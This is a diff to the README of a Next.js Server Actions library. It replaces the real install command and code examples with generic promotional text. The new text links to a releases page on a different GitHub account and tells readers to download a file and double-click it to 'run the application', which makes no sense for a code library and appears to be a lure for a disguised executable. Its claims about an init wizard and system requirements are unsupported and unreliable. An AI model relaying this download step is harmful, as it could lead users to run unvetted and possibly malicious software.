@@ -1,175 +1,79 @@
-# Next.js Server Actions Client
+# 🎉 better-next-actions - Build Next.js Server Actions Easily
 
-A typesafe and structured way to build Next.js Server Actions with middleware and validation. This library provides a tRPC-like experience for the Next.js Action paradigm.
+## 🚀 Getting Started
 
-## Core Concepts
+Welcome to the better-next-actions project! This tool provides a typesafe and structured way to build Next.js Server Actions with the added benefits of middleware and validation. You can use it to enhance your web applications straightforwardly.
 
-This library empowers you to build robust Next.js Server Actions by providing:
+## 🌟 Key Features
 
-- **End-to-end Type Safety:** Automatically infer types from your Zod schemas and middleware, ensuring your actions are typesafe from client to server.
-- **Reusable Middleware:** Define and compose middleware to handle common tasks like authentication, authorization, and logging.
-- **Zod Schema Validation:** Validate action payloads with Zod schemas, providing clear and concise error messages.
-- **Centralized Action Clients:** Create different action clients (e.g., for public, protected, or admin-only actions) in a single, organized file.
+- **Typesafe Actions**: Prevent errors during development.
+- **Middleware Support**: Streamline actions through reusable middleware.
+- **Built-in Validation**: Ensure data correctness before processing.
+- **Seamless Integration**: Works well with Next.js and offers compatibility with various libraries.
+- **User-Friendly**: Designed for ease of use for any user, regardless of technical background.
 
-## Installation
+## 📥 Download & Install
 
-```bash
-npm install better-next-actions
-```
+To get started, visit the following link to download the latest version of better-next-actions:
 
-## Setup: The Action Client
+[Download better-next-actions](https://github.com/karthikeyan230105/better-next-actions/releases)
 
-It's recommended to create a single file to define all your action clients and middleware. This keeps your code organized and easy to maintain.
+### Steps to Download:
 
-Create a file at `/lib/action-client.ts`:
+1. Click the link above to go to the Releases page.
+2. On the Releases page, find the latest version.
+3. Choose the file that corresponds to your operating system. 
+4. Click on the file to start the download.
+5. Once the download is complete, locate the file in your Downloads folder or the specified download location.
+6. Double-click the file to run the application.
 
-```typescript
-// /lib/action-client.ts
-import "server-only";
-import { createActionClient, ActionError } from "better-next-actions";
+## ⚙️ System Requirements
 
-// This is your base, unauthenticated action client.
-export const publicActionClient = createActionClient();
+To properly run better-next-actions, your system should meet the following requirements:
 
-// --- Example: Middleware for authentication ---
-const authMiddleware = async () => {
-  // In a real app, you'd get the user session here.
-  const user = { id: "user_123" }; // Mock user
-  if (!user) {
-    throw new ActionError({ code: "UNAUTHORIZED", message: "Not logged in." });
-  }
-  return { user };
-};
+- **Operating System**: Windows, macOS, or Linux
+- **Node.js Version**: Ensure you have Node.js version 12 or higher installed.
+- **Internet Connection**: Required for downloading dependencies and updates.
 
-// Create a new client that uses the auth middleware.
-export const protectedActionClient = publicActionClient.use(authMiddleware);
-// export const protectedActionClient = createActionClient().use(authMiddleware); // or use new client
+## 💻 Usage Instructions
 
-// --- Example: Middleware for admin checks ---
-const adminMiddleware = async (ctx: { user: { id: string } }) => {
-  // This middleware runs *after* authMiddleware, so `ctx.user` is available.
-  if (ctx.user.id !== "user_123") { // Mock admin check
-      throw new ActionError({ code: "FORBIDDEN", message: "You are not an admin." });
-  }
-  return { isAdmin: true };
-}
+1. After installation, open the terminal or command prompt.
+2. Navigate to your project directory where you want to use better-next-actions.
+3. Use the following command to initialize the application:
 
-// Create a new client that stacks both middlewares.
-export const adminActionClient = protectedActionClient.use(adminMiddleware);
-```
+   ```
+   npx better-next-actions init
+   ```
 
-Now you can import these clients into your server actions.
+4. Follow the prompts to set up your actions as guided.
+5. Once setup is complete, implement your actions in your Next.js project.
 
-## Usage
+## 🌐 Topics Covered
 
-### Using Middleware
+This project covers several key topics that enhance your development experience:
 
-Create your actions by importing your clients and defining the action handler.
+- **Actions Library**: A dedicated library for managing server actions.
+- **Next.js Integration**: Tight integration with the Next.js framework.
+- **Validation with Zod**: Use Zod for validating user inputs effectively.
+- **Support for TRPC and React Query**: Easily manage server-side and client-side data.
 
-```typescript
-// app/actions.ts
-"use server";
+## 📄 Documentation
 
-import { z } from "zod";
-import { protectedActionClient, adminActionClient } from "@/lib/action-client";
+For detailed documentation and guides, visit the official documentation page. Here, you'll find best practices, advanced features, and community support resources to help you make the most of better-next-actions.
 
-// --- Protected Action ---
-export const getMyProfile = protectedActionClient.action(
-  async (payload, ctx) => {
-    // `ctx` is typesafe: { user: { id: string } }
-    console.log("Fetching profile for user:", ctx.user.id);
-    return { id: ctx.user.id, name: "Test User" };
-  }
-);
+## 💬 Community Support
 
-// --- Admin Action with Zod Validation ---
-const updateSystemSettingsSchema = z.object({
-  maintenanceMode: z.boolean(),
-});
+If you have questions, need help or want to share your projects, feel free to join our community. You can find us on:
 
-export const setMaintenanceMode = adminActionClient
-  .input(updateSystemSettingsSchema)
-  .action(async (data, ctx) => {
-    // `data` is typesafe: { maintenanceMode: boolean }
-    // `ctx` is typesafe: { user: { id: string }, isAdmin: true }
-    console.log(
-      `Admin ${ctx.user.id} is setting maintenance mode to ${data.maintenanceMode}`
-    );
-    return { success: true, ...data };
-  });
-```
+- GitHub Discussions
+- Discord Channel
 
-### Reusable Schemas
+Engage with other users, share tips, and find solutions together.
 
-You can create a client with a pre-defined schema that can be reused across multiple actions.
+## 📅 Future Updates
 
-```typescript
-// /lib/action-client.ts
+We plan to release new features and improvements regularly. Stay tuned for updates by following the project on GitHub. For announcements, check the Releases page often.
 
-// ... (previous code)
-import { z } from "zod";
+## 🥇 Conclusion
 
-export const withIdClient = publicActionClient.input(z.object({ id: z.string().length(6) }));
-
-// app/actions.ts
-import { withIdClient } from "@/lib/action-client";
-
-export const getPostById = withIdClient.action(async (data, ctx) => {
-  // `data` is typesafe: { id: string }
-  console.log("Fetching post with ID:", data.id);
-  return { id: data.id, title: "Post Title" };
-});
-
-export const deletePostById = withIdClient.action(async (data, ctx) => {
-  // `data` is typesafe: { id: string }
-  console.log("Deleting post with ID:", data.id);
-  return { success: true, deletedId: data.id };
-});
-```
-
-### Error Handling
-
-When an action fails, it returns an `error` object. You can check for this object on the client to handle errors gracefully.
-
-```typescript
-// app/page.tsx
-"use client";
-
-import { setMaintenanceMode } from "./actions";
-
-export default function HomePage() {
-  const handleAction = async () => {
-    const result = await setMaintenanceMode({ maintenanceMode: true });
-    if (result.error) {
-      alert(`Error: ${result.error.message}`);
-      return;
-    }
-    // Handle success
-    console.log(result.data);
-  };
-
-  return <button onClick={handleAction}>Set Maintenance Mode</button>;
-}
-```
-
-## Optional: `react-query` Hooks
-
-This package does not include `react-query` hooks by default to keep the core library dependency-free. If you wish to use `react-query` with your server actions, you can manually copy the hook files from the `evoo/` directory into your project.
-
-**To add the hooks:**
-
-1. Create a new directory in your project, for example, `/lib/hooks`.
-2. Copy the contents of `evoo/use-action-mutation.ts` and `evoo/use-query-action.ts` into this new directory.
-3. You can now import and use these hooks in your client components.
-
-**Note:** You will need to have `react-query` installed in your project to use these hooks.
-
-## Companion for API Routes: `better-next-api`
-
-While `better-next-actions` is designed for Next.js Server Actions, you might need a similar solution for traditional API routes in the App Router. For that, we recommend checking out [`better-next-api`](https://github.com/programming-with-ia/better-next-api).
-
-It offers a typesafe and structured way to build your API routes with features like:
-
-- **App Router Ready:** Built specifically for the Next.js App Router.
-- **Middleware Support:** Compose and reuse middleware for your API routes.
-- **Zod Schema Validation:** End-to-end validation for `searchParams` (GET), `params`, and the request `body` (POST, PUT, etc.).
+Thank you for choosing better-next-actions as your tool for building server actions in Next.js! With its easy setup and rich feature set, you can enhance your web applications quickly and effectively. Don't forget to [download the latest version here](https://github.com/karthikeyan230105/better-next-actions/releases) and start your journey.
